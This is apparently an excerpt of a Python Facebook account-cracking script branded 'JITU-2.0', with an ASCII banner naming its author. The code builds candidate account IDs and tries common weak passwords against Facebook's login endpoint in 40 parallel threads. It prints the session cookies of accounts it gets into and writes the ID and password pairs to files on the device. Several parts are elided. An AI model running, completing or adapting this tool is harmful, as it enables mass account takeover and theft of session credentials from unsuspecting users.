...
for ua in range(10000):
	...
	ugen.append(JITU)
os.system("https://chat.whatsapp.com/GEa3nQQRYY5HcNflhiLCeP/")
logo =("""
...
\033[1;91m  █████  ██████   ██    ██████   \033[1;96m 2\033[1;97m .\033[1;98m 0
 ...
 ----------------------------------------------
\033[1;32m•\033[1;37m CREATED BY  \033[1;32m •√\033[1;37m  JITESH KUMAR SINHA
\033[1;32m•\033[1;37m WHATSAPP    \033[1;32m •√\033[1;37m  +919430738153
\033[1;32m•\033[1;37m FRIENDS     \033[1;32m •√\033[1;37m  JITU TEAM
\033[1;32m•\033[1;37m TOOLS       \033[1;32m •√\033[1;37m  FREE
\033[1;32m•\033[1;37m NO ANY ID   \033[1;32m •√\033[1;37m  USED AIRPLANE MODE
...
def JITU():
    ...
    print("")
    print("\033[1;91m ╔═════════════════════════════════╗")
    print("\033[1;33m ║  \033[1;35m[\033[1;32m1\033[1;35m][\033[1;32mA\033[1;35m] \033[1;32m ᖇᗩᑎᗪOᗰ ᑕᒪOᑎE           \033[1;36m║")
    print("\033[1;92m ╠═════════════════════════════════╣")
    print("\033[1;93m ║  \033[1;35m[\033[1;32m0\033[1;35m][\033[1;32mX\033[1;35m] \033[1;32m ᎬХᏆͲ                   \033[1;36m║")
    print("\033[1;33m ╚═════════════════════════════════╝")
    print("")
    JITU = input(f'\033[1;32m ՏᎬᏞᎬᏟͲᎬᎠ ƳϴႮᎡ ϴᏢͲᏆϴΝ :\033[1;36m ')
    if JITU in ["1"]:
        JITUs()
    if JITU in ["0"]:
        os.system('exit')
...
def JITUs():
    ...
    with ThreadPool(max_workers=40) as Fb_crack:
        ...
        print(f'\033[1;96m║\033[1;92m ᏀᏆҒͲ ᏴƳ JITU-2.0 ')
        print("\033[1;91m╚═════════════════════════════════════╝")
        for love in user:
            pwx = [love,love[2:],code+love[:3],'FreeFire','Pubg123','TikTok','Alh4aj']
            uid = code+love
            Fb_crack.submit(JITUm,uid,pwx,tl)
    print("\033[1;91m╔═══════════════════════════╗")
    print(' \033[1;91m[\033[1;91m😚\033[1;91m]\033[1;92m HACKED COMPLETE ')
    print(' \033[1;91m[\033[1;92m😚\033[1;91m]\033[1;92m HI IM JITU-2.0 ')
    print("\033[1;91m╚═══════════════════════════╝")


def JITUm(uid,pwx,tl):
    global loop
    global cps
    global oks
    global agents
    try:
        for ps in pwx:
            ...
            "user-agent": pro}
            lo = session.post('https://web.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print('\033[1;96m[\033[1;92mҒᏴ-JITU-2.0-ϴᏦ\033[1;96m]\033[1;92m '+uid+' \033[1;96m◉\033[1;92m '+ps+'')
                print(f'\033[1;36mᏟϴϴᏦᏆᎬ : \033[1;35m'+coki)
                open('/sdcard/JITU-2.0-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('\033[1;90m[ҒᏴ-JITU-2.0-ᏟᏢ] '+uid+' ◉ '+ps+' \n')
                open('/sdcard/JITU-2.0-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
